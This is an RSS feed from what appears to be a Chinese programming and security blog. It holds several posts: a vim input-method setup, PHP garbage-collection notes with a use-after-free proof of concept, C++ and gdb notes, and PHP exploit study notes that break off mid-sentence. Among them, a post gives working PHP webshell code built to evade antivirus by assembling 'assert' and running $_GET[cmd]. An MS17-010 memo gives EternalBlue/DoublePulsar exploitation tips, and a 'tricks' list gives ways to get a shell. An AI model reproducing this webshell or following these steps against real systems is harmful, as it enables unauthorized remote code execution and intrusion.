<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sun, 14 May 2017 15:33:52 +0800</pubDate>
    <lastBuildDate>Sun, 14 May 2017 15:33:52 +0800</lastBuildDate>
    <generator>Jekyll v3.4.2</generator>
    
      <item>
        <title>vim中英文输入法自动切换方案</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)关于vim中中英文自动切换方案,实现:
1.正常模式时自动切换成英文
2.输入模式中自动切换成上一次输入模式中的输入方式
3.输入模式中使用shift切换中文输入方式

b)测试环境
macOS sierra
vim8
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.安装百度五笔输入法,在系统中设置只使用系统自带的英文输入法和百度五笔两种输入法,如下图
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/inputMethod.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2.设置百度五笔输入法中使用shift作为中英切换键,如下图
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/baiduWuBi.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3.安装AutoIM插件
    在~/.vimrc中加入Plugin '3xp10it/AutoIM'
    vim
    :BundleInstall

4.在~/.vimrc文件中添加:
    let g:AutoIM_enim_id=&quot;com.apple.keylayout.ABC&quot;
    let g:AutoIM_zhim_id='com.baidu.inputmethod.BaiduIM.wubi'
    其中上面两个id分别是英文输入法和百度五笔输入法,如果安装的是其他输入法,需自行设置,查看输入法方法为:
    安装3xp10it/AutoIM插件后退出vim并在终端运行issw -l
    或者手动安装https://github.com/vovkasm/input-source-switcher后运行issw -l
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-result&quot;&gt;0x02 Result&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;实现效果如下:
1.从插入模式进入正常模式后自动切换成macOS自带的英文输入法
2.从正常模式进入插入模式后自动切换成安装的百度五笔输入法
3.在百度五笔输入法中有两种输入方式,一种是输入中文,一种是输入英文,通过shift键可切换
3.切换到百度五笔输入法后会默认使用上次百度五笔输入法的最终输入方式(英文或中文)(这是百度五笔输入法自带的功能)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-attention&quot;&gt;0x03 Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.如果出现不灵情况,按系统切换输入法快捷键(如command+space)重新切换到百度五笔输入法即可
2.从输入模式到正常模式(esc)后不要按键过快,大概要等0.5s,看到屏幕闪一下代表完成输入法自动完成切换
3.如果有时候在百度五笔输入法中按shift无法使用英文输入方式,则要在百度五笔输入法设置中重新设置shift为中英切换键
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 14 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/14/vim%E4%B8%AD%E8%8B%B1%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E6%96%B9%E6%A1%88/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/14/vim%E4%B8%AD%E8%8B%B1%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E6%96%B9%E6%A1%88/</guid>
        
        <category>输入法</category>
        
        <category>vimrc</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>php对可能是垃圾的zval的回收过程的理解</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;本文记录对php的对可能是垃圾的zval的回收过程的理解
2&amp;gt;必读link:
    http://www.freebuf.com/vuls/122938.html
3&amp;gt;测试环境:php5.4.34(php5.3之后的垃圾回收机制)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;h4 id=&quot;0x01-不同的说法&quot;&gt;0x01 不同的说法&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;认为上面link中的以下说法不对:
------------refer-----------
首先用zval_mark_grey把外部数组标记为灰色.
对外部数组的子节点即ArrayObject对象标记为灰色refcount减一,此时ArrayObject的refcount为0.
对ArrayObject的子节点即内部数组的两个成员分别指向外部数组和内部数组,分别调用zval_mark_grey,实际又会对外部数组和内
部数组进行操作.因为外部数组已经被标记过灰色所以直接返回.而内部数组被标记为灰色.两个数组分别refcount减一此时两个数
组refcount都是1.然后又会对内部数组成员分别指向外部数组和内部数组调用zval_mark_grey.这时会再次把外部数组和内部数组
的refcount减一,此时外部数组和内部数组的refcount都已经是0了.
------------refer-----------
认为上面的:
&quot;首先用zval_mark_grey把外部数组标记为灰色.&quot;是错的,认为没有这个操作.
&quot;因为外部数组已经被标记过灰色所以直接返回.&quot;是错的,因为外部数组不是灰色,认为外部数组不会被处理(认为不会被标记成灰色
也不会将外部数据的refcount减1)

认为下面的refer中的说法是对的:
http://www.cnblogs.com/orlion/p/5350844.html
------------refer-------------
A:为了避免每次变量的refcount减少的时候都调用GC的算法进行垃圾判断,此算法会先把所有前面准则3情况下的zval节点放入
一个节点(root)缓冲区(root buffer),并且将这些zval节点标记成紫色,同时算法必须确保每一个zval节点在缓冲区中之出现一
次.当缓冲区被节点塞满的时候,GC才开始开始对缓冲区中的zval节点进行垃圾判断.

B:当缓冲区满了之后,算法以深度优先对每一个节点所包含的zval进行减1操作,为了确保不会对同一个zval的refcount重复执行
减1操作,一旦zval的refcount减1之后会将zval标记成灰色.需要强调的是,这个步骤中,起初节点zval本身不做减1操作,但是如果
节点zval中包含的zval又指向了节点zval(环形引用),那么这个时候需要对节点zval进行减1操作.

C:算法再次以深度优先判断每一个节点包含的zval的值,如果zval的refcount等于0,那么将其标记成白色(代表垃圾),如果zval的
refcount大于0,那么将对此zval以及其包含的zval进行refcount加1操作,这个是对非垃圾的还原操作,同时将这些zval的颜色变成
黑色(zval的默认颜色属性)

D:遍历zval节点,将C中标记成白色的节点zval释放掉.
------------refer-------------

这里的讲的深度优先的理解如下:
(refer:http://baike.baidu.com/link?url=2hjd4UB9VHErMLvWRQ1aJU6vRajinVYZHDre1kWEPAVxsagDQUgBwcIqVv7NKgJLsPJmUfke74aihNXFjh8JvmJMm9OjwMPKmLXvx7geXkAERoRU_kORCBdiLhpvhwJX1UAwIsIAaWG98zgfbUDwq_)
深度优先搜索是一种在开发爬虫早期使用较多的方法.它的目的是要达到被搜索结构的叶结点(即那些不包含任何超链的HTML文件).
在一个HTML文件中,当一个超链被选择后,被链接的HTML文件将执行深度优先搜索,即在搜索其余的超链结果之前必须先完整地搜索
单独的一条链.深度优先搜索沿着HTML文件上的超链走到不能再深入为止,然后返回到某一个HTML文件,再继续选择该HTML文件中的
其他超链.当不再有其他超链可选择时,说明搜索已经结束.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0x02-处理过程&quot;&gt;0x02 处理过程&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;上面link(http://www.freebuf.com/vuls/122938.html)中的代码如下:

&amp;lt;?php
$serialized_string = 'a:1:{i:1;C:11:&quot;ArrayObject&quot;:37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}';
$outer_array = unserialize($serialized_string);
gc_collect_cycles();
$filler1 = &quot;aaaa&quot;;
$filler2 = &quot;bbbb&quot;;
var_dump($outer_array);
?&amp;gt;

预期的结果应该是:

array(1) { // outer_array,refcount=2,is_ref=0
  [1]=&amp;gt;
  object(ArrayObject)#1 (1) { // refcount=1,is_ref=0
    [&quot;storage&quot;:&quot;ArrayObject&quot;:private]=&amp;gt;
    array(2) { // inner_array,refcount=2,is_ref=1
      [1]=&amp;gt;
      // Reference to inner_array,refcount=2,is_ref=1
      [2]=&amp;gt;
      // Reference to outer_array,refcount=2,is_ref=0
    }
  }
}

最后的结果是:

string(4) &quot;bbbb&quot;

之所以会产生这样的结果是因为有个处理不当的漏洞,也即对ArrayObject的refcount的减1处理不当(实际对ArrayObject的子
zval也即array(2)[即inner_array]对应的zval的多做了一次对array(2)的子zval(两个reference)的refcount减1的操作)

实际上按照php5.3之后的回收机制应该要做的是这样的流程:

a)由于gc_root_buffer的个数超过了设定的100000,于是进入gc_collect_cycles()函数进行相关处理.

b)首先判断array(1)[也即outer_array]是不是可能是一个垃圾zval,判断依据为:

1:如果一个zval的refcount增加,那么此zval还在使用,不属于垃圾
2:如果一个zval的refcount减少到0, 那么zval可以被释放掉,不属于垃圾
3:如果一个zval的refcount减少之后大于0,那么此zval还不能被释放,此zval可能成为一个垃圾
(refer:http://www.cnblogs.com/orlion/p/5350844.html)
array(1)的refcount为2,满足上面第3点,也即array(1)[也即outer_array]可能是一个垃圾zval,由于gc_collect_cycles()函数只
对可能是垃圾的zval进行处理,同样判断出array(2)[也即inner_array]对应的zval可能是一个垃圾zval,这样的话调用
gc_collect_cycles()函数后会对array(1)和array(2)对应的2个zval进行如下处理过程

c)首先将array(1)[也即outer_array]对应的zval的子zval也即object(ArrayObject)对应的zval的refcount减1,此时相关变化如下:
    object(ArrayObject)#1 (1) { // refcount=0,is_ref=0
然后对object(ArrayObject)对应的zval的子zval也即array(2)[也即inner_array]对应的zval的refcount减1,此时相关变化如下:
    array(2) { // inner_array,refcount=1,is_ref=1
然后对array(2)[也即inner_array]对应的zval的子zval也即array(2)的两个元素[1]和[2]对应的zval的refcount各减1,此时相关
变化如下:
    array(1) { // outer_array,refcount=1,is_ref=0
      [1]=&amp;gt;
      // Reference to inner_array,refcount=1,is_ref=1
      [2]=&amp;gt;
      // Reference to outer_array,refcount=1,is_ref=0

到这里各个zval的refcount结果如下:

    array(1) { // outer_array,refcount=1,is_ref=0
      [1]=&amp;gt;
      object(ArrayObject)#1 (1) { // refcount=0,is_ref=0
        [&quot;storage&quot;:&quot;ArrayObject&quot;:private]=&amp;gt;
        array(2) { // inner_array,refcount=1,is_ref=1
          [1]=&amp;gt;
          // Reference to inner_array,refcount=1,is_ref=1
          [2]=&amp;gt;
          // Reference to outer_array,refcount=1,is_ref=0
        }
      }
    }
现在对array(1)[也即outer_array]对应的zval的&quot;深度优先对包含的子zval的refcount减1操作&quot;完成,发现array(1)对应的zval
的refcount没有变成0,然后判定array(1)对应的zval(这个原来认为可能是垃圾zval的zval)不是垃圾zval,然后将刚才的
refcount减1过的zval的refcount进行+1复原.然后进入判断下一个zval是否是垃圾zval的流程,也即判断
array(2)[也即inner_array]对应的zval是不是一个垃圾zval的流程,易知这个流程结束后会发现它并
不是一个垃圾zval,然后复原相关zval的refcount,到此结束对这2个zval的gc_collect_cycles()的处理

本文讲的主要是gc_collect_cycles()的意图流程,http://www.freebuf.com/vuls/122938.html中的漏洞成因是因为相关php版本的
实际处理细节与这里讲的意图流程不同导致.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 12 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/12/php%E5%AF%B9%E5%8F%AF%E8%83%BD%E6%98%AF%E5%9E%83%E5%9C%BE%E7%9A%84zval%E7%9A%84%E5%9B%9E%E6%94%B6%E8%BF%87%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/12/php%E5%AF%B9%E5%8F%AF%E8%83%BD%E6%98%AF%E5%9E%83%E5%9C%BE%E7%9A%84zval%E7%9A%84%E5%9B%9E%E6%94%B6%E8%BF%87%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/</guid>
        
        <category>php</category>
        
        <category>垃圾回收</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>ms17-010备忘录</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;检测方法:
1.msf search ms17010
2.https://github.com/RiskSense-Ops/MS17-010

实战溢出getshell方法:
1.https://github.com/fuzzbunch/fuzzbunch
a)命令行模式:python fb.py(先用eternalblue再用double[tab])
b)gui模式:python configure_lp.py

2.msf第三方组合工具
https://www.youtube.com/watch?v=4OHLor9VaRI
    x64kali:
        dpkg --add-architecture i386 &amp;amp;&amp;amp; apt-get update &amp;amp;&amp;amp; apt-get install wine32 
        rm -r ~/.wine 
        wine cmd.exe   
        exit
https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit

3.python版https://www.t00ls.net/thread-39687-1-1.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-attention&quot;&gt;0x01 Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.win7 x86效果不好,不稳定,原因不明,考虑换成fuzzbunch的gui方法
2.目标是win7 x86时用reverse_tcp时必须用lport=4444,本机的端口为4444(test in elevenpaths/eternalblue-doublepulsar-metasploit)
3.目标是win7 x86时用bind_tcp时必须用lport=4444,目标的端口为4444(test in elevenpaths/eternalblue-doublepulsar-metasploit)
2.fuzzbunch的命令行模式默认设置的注入的进程是lsass.exe,x86平台下会导致目标机器重启,换成explorer.exe(或wlms.exe)
3.目标系统为x64位系统最好设置注入进程为lsass.exe
4.有些有公网ip的云主机(vps)就算设置了打开一些端口也会被服务商过滤掉,这种情况要在vps上开不容易被过滤的端口,比如443,53,80等
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-special&quot;&gt;0x02 Special&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;特殊利用方式,用这个漏洞来提权,smb叠加利用提权
https://www.t00ls.net/thread-39703-1-1.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 04 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/04/ms17-010%E5%A4%87%E5%BF%98%E5%BD%95/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/04/ms17-010%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
        
        <category>ms17-010</category>
        
        <category>web</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>tricks</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录奇技
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.phpinfo页面+lfi漏洞可getshell
2.sqli可load_file时可利用smb重放反弹shell[未验证]
3.php代码审计时全文搜索unserilize函数的调用,分析这个unserilize有没有漏洞
    如果有unserialize客户端输入则危害很大,可远程代码执行(cve-2014-8142,cve-2015-0231等)
4.phpmyadmin的root用户没有写权限时可将general log设置为on,并把日志文件设置为php文件(t00ls)
    https://www.t00ls.net/articles-38892.html
5.smb叠加利用提权(利用ms17-010)
    https://www.t00ls.net/thread-39703-1-1.html
6.获取网站隐藏后台地址
    https://www.t00ls.net/viewthread.php?tid=34239&amp;amp;extra=page=1&amp;amp;amp;filter=type&amp;amp;amp;typeid=39
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 27 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/27/tricks/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/27/tricks/</guid>
        
        <category>tricks</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>php中&amp;引用免杀webshell</title>
        <description>&lt;h3 id=&quot;0x00-php中的&quot;&gt;0x00 php中的&amp;amp;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.函数的参数引用
&amp;lt;?php
function test(&amp;amp;$a){ 
    $a=$a+100; 
    } 
    $b=1; 
    echo $b;//输出１ 
    test($b);   //这里$b传递给函数的其实是$b的变量内容所处的内存地址,通过在函数里改变$a的值就可以改变$b的值了 
    echo &quot;&amp;lt;br&amp;gt;&quot;; 
    echo $b;//输出101
?&amp;gt;

2.函数的返回引用
&amp;lt;?php
function &amp;amp;test()
{ 
    static $b=0;//申明一个静态变量 
    $b=$b+1; 
    echo $b; 
    return $b; 
}

$a=test();//这条语句会输出$b的值为１ 
$a=5; 
$a=test();//这条语句会输出$b的值为2
$a=&amp;amp;test();//这条语句会输出$b的值为3,这句相当于$a=&amp;amp;$b;
$a=5; 
$a=test();//这条语句会输出$b的值为6
?&amp;gt;

理解参考:
http://www.cnblogs.com/thinksasa/p/3334492.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;h4 id=&quot;a利用函数的参数引用免杀&quot;&gt;a)利用函数的参数引用免杀&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
function foo(&amp;amp;$var)
{
    $var=$var.'t';
}
$a=&quot;asser&quot;;
foo($a);
$a($_GET[cmd]);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;b利用函数的返回引用免杀&quot;&gt;b)利用函数的返回引用免杀&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
class talker{
    public $data = 'Hi';
    public function &amp;amp; get(){
        return $this-&amp;gt;data;
    }
}

$aa = new talker();
$d = &amp;amp;$aa-&amp;gt;get();
$d = $_GET[cmd];

function foo(&amp;amp;$var)
{
    $var=$var.'t';
}
$a=&quot;asser&quot;;
foo($a);
$a($aa-&amp;gt;data);

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;本文代码下载&lt;br /&gt;
&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/php/%26&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</guid>
        
        <category>php</category>
        
        <category>引用</category>
        
        <category>免杀</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>c++中的&amp;的用法</title>
        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.cnblogs.com/Mr-xu/archive/2012/08/07/2626973.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.c里面&amp;amp;只用作`取地址`的功能,c++中不但有此功能还新增了`引用`的功能

2.&amp;amp;作为c++中的引用功能时,在声明一个引用时不分配新内存,是被引用变量的别名,引用在声明时必须赋值

3.eg.
int a=1
int &amp;amp;b=a;引用    
c=&amp;amp;a;取地址
d=&amp;amp;b;取地址
在第2句中=左边的&amp;amp;符号是引用,第3|4句中的&amp;amp;是取地址,最后的结果是c与d相等

4.&amp;amp;和类型在一起的是引用,和变量在一起的是取地址
eg.
int func(int &amp;amp;a)
{};引用

5.不能建立引用的数组,因为数组是由元素组成,不能由&quot;别名&quot;组成,可以建立数组的引用(引用即别名)

6.引用的好处
void swap(int &amp;amp;a,int &amp;amp;b)
{
int c=a;a=b;b=c;
}
在swap函数被调用时如果两个参数是指针而不是引用,那么在形参转成实参的过程将申请新的内存,如果两个参数是引用则不用
新申请内存来存放两个实参
eg.
int main()
{
cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
swap(former,latter);
cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
}
这里main函数调用swap函数时如果输入的是2,3,main函数中调用swqp(2,3)时对应swap函数中:
swap函数中认为2的别名是former,3的别名是latter,swap函数认为a即是former,b即是latter,也即在swap函数调用时运行如下:
int &amp;amp;a=former;
int &amp;amp;b=latter;
int c=a;
a=b;
b=c;
这样就可直接操作main函数空间中的former和latter变量,从而不用再在swap函数中新申请内存并操作
实例:
------1.cpp-----
#include &amp;lt;iostream&amp;gt;
using namespace std;
void swap(int &amp;amp;a,int &amp;amp;b)
{
    int c=a;
    a=b;
    b=c;
}
int main()
{
    int former,latter;
    cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
    swap(former,latter);
    cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
    return 0;

}
-------end------
g++ 1.cpp -o 1
./1
输入
1111
2222
输出
22221111

------2.cpp------
#include &amp;lt;iostream&amp;gt;
using namespace std;
void swap(int a,int b)
{
    int c=a;
    a=b;
    b=c;
}
int main()
{
    int former,latter;
    cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
    swap(former,latter);
    cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
    return 0;

}
-------end-------
g++ 2.cpp -o 2
./2
输入
1111
2222
输出
11112222
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/04/25/c++%E4%B8%AD%E7%9A%84&%E7%9A%84%E7%94%A8%E6%B3%95/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/04/25/c++%E4%B8%AD%E7%9A%84&%E7%9A%84%E7%94%A8%E6%B3%95/</guid>
        
        <category>c/c++</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>gdb命令</title>
        <description>&lt;h3 id=&quot;0x01-gdb常用命令&quot;&gt;0x01 gdb常用命令&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb
help
help data
help stack
help status

gdb stack0           #===&amp;gt;gdb + file stack0
l(list)              #show source
b 7(break 7)         #add break on line7
b 8(break 8)         #add break on line8
b 11
b 13
b 15
info b(info break)
info registers       #show registers
r(run)               #第一次运行或重新开始运行程序
start                #开始运行程序
continue             #继续运行
disas /m
            /r      #show hex(显示汇编指令对应十六进制值)
            /m      #show source if available(如果有源码,显示对应行源码)
set disassembly-flavor att/intel     #设置att或intel格式
set disassemble-next-line            #设置下一步是否显示汇编码
si或s(setpi)                            #==&amp;gt; step into,like f7 in od
ni或n(nexti)                            #==&amp;gt; like f8 in od
leave                #立即中断当前函数运行并返回,当前函数的剩余语句将不被执行
finish               #执行到当前函数返回之后停止,当前函数的剩余语句将正常运行
bt(backtrace)        #查看所有栈帧信息
f num(frame num)     #选择并打印第num个栈帧信息
info f(info frame)   #查看当前栈帧信息

layout:用于分割窗口,可以一边查看代码,一边测试:
layout src:显示源代码窗口
layout asm:显示反汇编窗口
layout regs:显示源代码/反汇编和CPU寄存器窗口
layout split:显示源代码和反汇编窗口
Ctrl + L:刷新窗口
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 20 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</guid>
        
        <category>gdb</category>
        
        <category>commands</category>
        
        <category>linux</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>PHP中的内存破坏漏洞利用学习</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;学习乌云中的&amp;lt;&amp;lt;PHP中的内存破坏漏洞利用&amp;gt;&amp;gt;
link:http://cb.drops.wiki/drops/papers-4864.html
cvelink:
    CVE-2014-8142
    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8142
    在PHP之前的ext/standard/var_unserializer.re中的process_nested_data函数中的uaf漏洞[在5.4.36之前,
    5.5.20之前的5.5.x和5.5.4之前的5.6.x]允许远程攻击者通过一个使用非串行化调用,利用对对象的序列化属性中的重复
    键的不当处理,这与CVE-2004-1019不同.

    CVE-2015-0231
    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0231
    在PHP之前的ext/standard/var_unserializer.re中的process_nested_data函数中的uaf漏洞[在5.4.37之前,
    5.5.21之前是5.5.x,5.5.5之前是5.6.x,5.6.5之前]允许远程攻击者通过一个制造的非序列化调用,利用对象序列化属性
    中重复数字键的不当处理. 注意:由于CVE-2014-8142的修复程序不完整,因此存在此漏洞.

a)看懂此文所需知识

[php垃圾回收理解]
http://www.cnblogs.com/orlion/p/5350844.html
http://blog.100dos.com/2017/04/07/php-garbage-collection-collect-cycles/

http://blog.csdn.net/ohmygirl/article/details/41542445
http://www.cnblogs.com/LittleHann/p/4242535.html
https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf
http://blog.nsfocus.net/tech/技术分享/2016/08/08/PHP-unserialize.html

b)理解unserialize
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize1.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize2.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize3.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize4.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize5.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize6.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize7.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize8.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize9.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/unserialize10.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c)本文两个难理解的问题
    1.为什么unserialize后会free内存,具体原理是什么?
        [http://www.cnblogs.com/orlion/p/5350844.html]
        A:为了避免每次变量的refcount减少的时候都调用GC的算法进行垃圾判断,此算法会先把所有前面准则3情况下的zval节
        点放入一个节点(root)缓冲区(root buffer),并且将这些zval节点标记成紫色,同时算法必须确保每一个zval节点在缓冲
        区中之出现一次.当缓冲区被节点塞满的时候,GC才开始开始对缓冲区中的zval节点进行垃圾判断.

        B:当缓冲区满了之后,算法以深度优先对每一个节点所包含的zval进行减1操作,为了确保不会对同一个zval的refcount重
        复执行减1操作,一旦zval的refcount减1之后会将zval标记成灰色.需要强调的是,这个步骤中,起初节点zval本身不做减1
        操作,但是如果节点zval中包含的zval又指向了节点zval(环形引用),那么这个时候需要对节点zval进行减1操作.

        C:算法再次以深度优先判断每一个节点包含的zval的值,如果zval的refcount等于0,那么将其标记成白色(代表垃圾),如
        果zval的refcount大于0,那么将对此zval以及其包含的zval进行refcount加1操作,这个是对非垃圾的还原操作,同时将这
